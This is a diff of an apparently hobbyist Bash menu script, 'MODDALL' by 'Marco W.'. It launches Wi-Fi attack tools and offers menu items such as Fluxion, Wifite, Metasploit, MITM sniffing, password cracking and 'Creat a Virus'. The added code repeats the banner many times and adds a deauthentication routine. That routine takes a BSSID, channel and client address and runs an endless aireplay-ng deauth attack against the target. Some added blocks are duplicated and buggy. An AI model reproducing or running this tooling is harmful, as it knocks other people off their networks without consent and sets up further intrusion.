@@ -3,6 +3,39 @@ chmod +x AIRODUMP.sh
 chmod +x CAPTUREHANDESHAKE.sh
 chmod +x IFCONFIG.sh
 clear
+  echo "$(tput setaf 6) 
+    __  ___  ____    ____    ____    ___      __      __
+   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
+  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
+ / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
+/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
+
+" 
+YL="\e[1;33m"
+RED='\033[31m'
+echo "$(tput setaf 2) Version 2.4$(tput setaf 4) By Marco W."
+NC='\033[0m'
+echo "$(tput setaf 3) Select from menu:"
+echo
+echo	"        $(tput setaf 1)1) Airodump"
+echo 	'	2) Fluxion  '
+echo	'	3) Wifite   '
+echo 	'	4) Social Engineering '
+echo 	'	5) Metasploit '
+echo    '        6) Password Lists '
+echo    '        7) Deauthing Attacks ' 
+echo    '        8) Sniffing/MITM Attacks ' 
+echo    '        9) Data Sniffer '
+echo    '       10) Passwort cracking '
+echo    '       11) Creat a Virus '
+
+
+echo
+
+sleep 0.25
+ 
+clear
+
 echo "$(tput setaf 6) 
     __  ___  ____    ____    ____    ___      __      __
    /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
@@ -13,7 +46,39 @@ echo "$(tput setaf 6)
 " 
 YL="\e[1;33m"
 RED='\033[31m'
-echo "$(tput setaf 2) Version 2.2"
+echo "$(tput setaf 4) Version 2.4$(tput setaf 2) By Marco W."
+NC='\033[0m'
+echo "$(tput setaf 3) Select from menu:"
+echo
+echo	"        $(tput setaf 1)1) Airodump"
+echo 	'	2) Fluxion  '
+echo	'	3) Wifite   '
+echo 	'	4) Social Engineering '
+echo 	'	5) Metasploit '
+echo    '        6) Password Lists '
+echo    '        7) Deauthing Attacks ' 
+echo    '        8) Sniffing/MITM Attacks ' 
+echo    '        9) Data Sniffer '
+echo    '       10) Passwort cracking '
+echo    '       11) Creat a Virus '
+
+sleep 0.25
+
+echo 
+
+clear
+
+echo "$(tput setaf 6) 
+    __  ___  ____    ____    ____    ___      __      __
+   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
+  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
+ / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
+/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
+
+" 
+YL="\e[1;33m"
+RED='\033[31m'
+echo "$(tput setaf 2) Version 2.4$(tput setaf 4) By Marco W."
 NC='\033[0m'
 echo "$(tput setaf 3) Select from menu:"
 echo
@@ -31,6 +96,172 @@ echo    '       11) Creat a Virus '
 
 
 echo 
+
+sleep 0.25
+
+clear
+
+echo "$(tput setaf 6) 
+    __  ___  ____    ____    ____    ___      __      __
+   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
+  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
+ / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
+/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
+
+" 
+YL="\e[1;33m"
+RED='\033[31m'
+echo "$(tput setaf 4) Version 2.4$(tput setaf 2) By Marco W."
+NC='\033[0m'
+echo "$(tput setaf 3) Select from menu:"
+echo
+echo	"        $(tput setaf 1)1) Airodump"
+echo 	'	2) Fluxion  '
+echo	'	3) Wifite   '
+echo 	'	4) Social Engineering '
+echo 	'	5) Metasploit '
+echo    '        6) Password Lists '
+echo    '        7) Deauthing Attacks ' 
+echo    '        8) Sniffing/MITM Attacks ' 
+echo    '        9) Data Sniffer '
+echo    '       10) Passwort cracking '
+echo    '       11) Creat a Virus '
+
+
+echo 
+
+sleep 0.25
+
+echo "$(tput setaf 6) 
+    __  ___  ____    ____    ____    ___      __      __
+   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
+  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
+ / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
+/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
+
+" 
+YL="\e[1;33m"
+RED='\033[31m'
+echo "$(tput setaf 2) Version 2.4$(tput setaf 4) By Marco W."
+NC='\033[0m'
+echo "$(tput setaf 3) Select from menu:"
+echo
+echo	"        $(tput setaf 1)1) Airodump"
+echo 	'	2) Fluxion  '
+echo	'	3) Wifite   '
+echo 	'	4) Social Engineering '
+echo 	'	5) Metasploit '
+echo    '        6) Password Lists '
+echo    '        7) Deauthing Attacks ' 
+echo    '        8) Sniffing/MITM Attacks ' 
+echo    '        9) Data Sniffer '
+echo    '       10) Passwort cracking '
+echo    '       11) Creat a Virus '
+
+
+echo
+
+sleep 0.25
+ 
+clear
+
+echo "$(tput setaf 6) 
+    __  ___  ____    ____    ____    ___      __      __
+   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
+  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
+ / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
+/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
+
+" 
+YL="\e[1;33m"
+RED='\033[31m'
+echo "$(tput setaf 4) Version 2.4$(tput setaf 2) By Marco W."
+NC='\033[0m'
+echo "$(tput setaf 3) Select from menu:"
+echo
+echo	"        $(tput setaf 1)1) Airodump"
+echo 	'	2) Fluxion  '
+echo	'	3) Wifite   '
+echo 	'	4) Social Engineering '
+echo 	'	5) Metasploit '
+echo    '        6) Password Lists '
+echo    '        7) Deauthing Attacks ' 
+echo    '        8) Sniffing/MITM Attacks ' 
+echo    '        9) Data Sniffer '
+echo    '       10) Passwort cracking '
+echo    '       11) Creat a Virus '
+
+sleep 0.25
+
+echo 
+
+clear
+
+echo "$(tput setaf 6) 
+    __  ___  ____    ____    ____    ___      __      __
+   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
+  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
+ / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
+/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
+
+" 
+YL="\e[1;33m"
+RED='\033[31m'
+echo "$(tput setaf 2) Version 2.4$(tput setaf 4) By Marco W."
+NC='\033[0m'
+echo "$(tput setaf 3) Select from menu:"
+echo
+echo	"        $(tput setaf 1)1) Airodump"
+echo 	'	2) Fluxion  '
+echo	'	3) Wifite   '
+echo 	'	4) Social Engineering '
+echo 	'	5) Metasploit '
+echo    '        6) Password Lists '
+echo    '        7) Deauthing Attacks ' 
+echo    '        8) Sniffing/MITM Attacks ' 
+echo    '        9) Data Sniffer '
+echo    '       10) Passwort cracking '
+echo    '       11) Creat a Virus '
+
+
+echo 
+
+sleep 0.25
+
+clear
+
+echo "$(tput setaf 6) 
+    __  ___  ____    ____    ____    ___      __      __
+   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
+  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
+ / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
+/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
+
+" 
+YL="\e[1;33m"
+RED='\033[31m'
+echo "$(tput setaf 4) Version 2.4$(tput setaf 2) By Marco W."
+NC='\033[0m'
+echo "$(tput setaf 3) Select from menu:"
+echo
+echo	"        $(tput setaf 1)1) Airodump"
+echo 	'	2) Fluxion  '
+echo	'	3) Wifite   '
+echo 	'	4) Social Engineering '
+echo 	'	5) Metasploit '
+echo    '        6) Password Lists '
+echo    '        7) Deauthing Attacks ' 
+echo    '        8) Sniffing/MITM Attacks ' 
+echo    '        9) Data Sniffer '
+echo    '       10) Passwort cracking '
+echo    '       11) Creat a Virus '
+
+
+echo 
+
+sleep 0.25
+
+
 read EINGABE 
 if test $EINGABE = "1"   
   then 
@@ -321,9 +552,9 @@ fi
      then 
      ./MODDALL.sh
 fi
+ 
    if test $DMAIN = "1"
     then 
-    gnome-terminal --geometry 100x20+0+999999 -e ./AIRODUMP.sh
     clear
     echo "$(tput setaf 6)
     __  ___  ____    ____    ____    ___      __      __
@@ -334,6 +565,14 @@ fi
 
 "
     echo
+    echo 'Do you want to'
+   echo ' 1) Deauth all'
+   echo ' 2) Deauth a Client'
+   read DEAUTHCL
+   if test $DEAUTHCL = "1"  
+    then
+    gnome-terminal --geometry 100x20+0+999999 -- ./AIRODUMP.sh
+    clear
     echo "$(tput setaf 3)Put in the BSSID"
     read BSSIDXTDE
     clear
@@ -370,8 +609,54 @@ fi
 "
 
    sleep 3
-   bed
+   ./MODDALL.sh
 fi
+  if test $DEAUTHCL = "2"
+   then
+    gnome-terminal --geometry 100x20+0+999999 -- ./AIRODUMP.sh
+    clear
+    echo "$(tput setaf 3)Put in the BSSID"
+    read BSSIDXTDE
+    clear
+    echo "$(tput setaf 6)
+    __  ___  ____    ____    ____    ___      __      __
+   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
+  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
+ / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
+/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
+
+"
+    echo
+    echo "WAIT! BEFORE YOU PUT IN THE CHANNEL CLOSE THE SMALL WINDOW WICH OPENED A FEW MOMENTS AGO!"
+    echo "$(tput setaf 3)Put in the CHANNEL"
+    read CHANNELXTDE
+    gnome-terminal -- airodump-ng -c $CHANNELXTDE --bssid $BSSIDXTDE wlan0mon &
+    clear
+    echo Put in the Station adress!
+    read CLIENTT
+    echo Now that you are airodumping the victim you can also deauth it
+    echo ATTACK STARTS!
+    sleep 5
+       
+    xterm -e aireplay-ng --deauth 0 -a $BSSIDXTDE -c $CLIENTT wlan0mon &
+    clear
+    echo "
+
+  _____    ______              _    _   _______   _    _   _____   _   _    _____ 
+ |  __ \  |  ____|     /\     | |  | | |__   __| | |  | | |_   _| | \ | |  / ____|
+ | |  | | | |__       /  \    | |  | |    | |    | |__| |   | |   |  \| | | |  __ 
+ | |  | | |  __|     / /\ \   | |  | |    | |    |  __  |   | |   | . | | | | |_ |
+ | |__| | | |____   / ____ \  | |__| |    | |    | |  | |  _| |_  | |\  | | |__| |
+ |_____/  |______| /_/    \_\  \____/     |_|    |_|  |_| |_____| |_| \_|  \_____|
+                                                                                  
+                                                                                  
+
+"
+
+   sleep 3
+   ./MODDALL.sh
+fi
+	
     
 fi
    if test $SCANNING = "1"
@@ -393,6 +678,50 @@ fi
 "
 fi
 fi
+fi
+   if test $DEAUTHCL = "2"
+    then 
+    gnome-terminal --geometry 100x20+0+999999 -e ./AIRODUMP.sh
+    echo "Put in the BSSID"
+    read BSSIDXTDE
+    clear
+    echo "$(tput setaf 6)
+    __  ___  ____    ____    ____    ___      __      __
+   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
+  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
+ / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
+/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
+
+"
+    echo
+    echo "WAIT! BEFORE YOU PUT IN THE CHANNEL CLOSE THE SMALL WINDOW WICH OPENED A FEW MOMENTS AGO!"
+    echo "$(tput setaf 3)Put in the CHANNEL"
+    read CHANNELXTDE
+    xterm -e airodump-ng -c $CHANNELXTDE --bssid $BSSIDXTDE wlan0mon &
+    echo Now that you are airodumping the victim you can also deauth it
+    echo Put in the Station Adress
+    read CLIENTADRESS
+    sleep 3
+       
+    xterm -e aireplay-ng --deauth 0 -a $BSSIDXTDE wlan0mon &
+    clear
+    echo "
+
+  _____    ______              _    _   _______   _    _   _____   _   _    _____ 
+ |  __ \  |  ____|     /\     | |  | | |__   __| | |  | | |_   _| | \ | |  / ____|
+ | |  | | | |__       /  \    | |  | |    | |    | |__| |   | |   |  \| | | |  __ 
+ | |  | | |  __|     / /\ \   | |  | |    | |    |  __  |   | |   | . | | | | |_ |
+ | |__| | | |____   / ____ \  | |__| |    | |    | |  | |  _| |_  | |\  | | |__| |
+ |_____/  |______| /_/    \_\  \____/     |_|    |_|  |_| |_____| |_| \_|  \_____|
+                                                                                  
+                                                                                  
+
+"
+
+   sleep 3
+   bed
+fi
+    
 
    if test $EINGABE = "10"
     then 
